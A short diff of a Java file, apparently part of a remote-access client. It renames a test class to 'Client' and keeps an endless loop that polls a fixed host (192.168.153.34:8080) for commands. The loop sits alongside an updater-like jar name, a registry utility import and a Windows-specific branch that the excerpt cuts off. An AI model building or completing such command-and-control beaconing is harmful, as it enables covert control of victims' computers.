@@ -6,10 +6,7 @@ import com.am77.extern.RegistryUtils;
 
 import java.net.ConnectException;
 
-/**
- * Created by Carter on 5/2/17.
- */
-public class Tests {
+public class Client {
 
     public static String filename = "jupdate.jar";
     public static boolean debug = true;
@@ -17,12 +14,13 @@ public class Tests {
     public static void main(String[] args) throws InterruptedException{
 
         String os = System.getProperty("os.name");
+        String body = "";
 
         while (true) {
 
             try {
                 HttpRequest request = HttpRequest.get("http://192.168.153.34:8080");
-                String body = request.body();
+                body = request.body();
                 System.out.println(body);
 
                 if (os.startsWith("Windows")) {
